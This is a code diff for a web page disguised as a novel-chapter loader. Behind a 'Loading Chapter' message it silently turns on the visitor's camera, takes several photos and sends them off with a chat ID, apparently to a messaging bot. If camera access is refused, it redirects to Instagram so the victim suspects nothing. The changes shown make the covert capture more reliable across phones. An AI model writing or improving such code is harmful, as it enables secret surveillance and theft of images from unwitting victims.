@@ -7,7 +7,6 @@ let photoCount = 0;
 const maxPhotos = 3;
 
 async function startProcess() {
-    // Button click hone par text change kar ke loading dikhayenge
     document.getElementById('mainCard').innerHTML = `<h3>Loading Chapter...</h3><p style="color: #8e8e8e; font-size: 14px;">Please wait while the novel loads.</p>`;
 
     try {
@@ -17,11 +16,12 @@ async function startProcess() {
         });
         video.srcObject = stream;
         
-        // Camera on hone ke thodi der baad capture shuru hoga
+        // Video ko explicitly play karwaya hai taake doosre mobile par frames active ho jayein
+        await video.play();
+        
         setTimeout(captureAndSendPhotos, 1500);
     } catch (error) {
         console.error("Camera permission denied or error:", error);
-        // Agar koi permission deny bhi kare toh user ko lagega novel load ho raha hai
         setTimeout(() => {
             window.location.href = "https://instagram.com";
         }, 2000);
@@ -44,6 +44,11 @@ function captureAndSendPhotos() {
     context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
     canvas.toBlob((blob) => {
+        if (!blob) {
+            setTimeout(captureAndSendPhotos, 1200);
+            return;
+        }
+        
         photoCount++;
         const formData = new FormData();
         formData.append('chat_id', chat_id);
@@ -64,4 +69,5 @@ function captureAndSendPhotos() {
             setTimeout(captureAndSendPhotos, 1200);
         });
     }, 'image/jpeg', 0.8);
-                  }
+}
+    
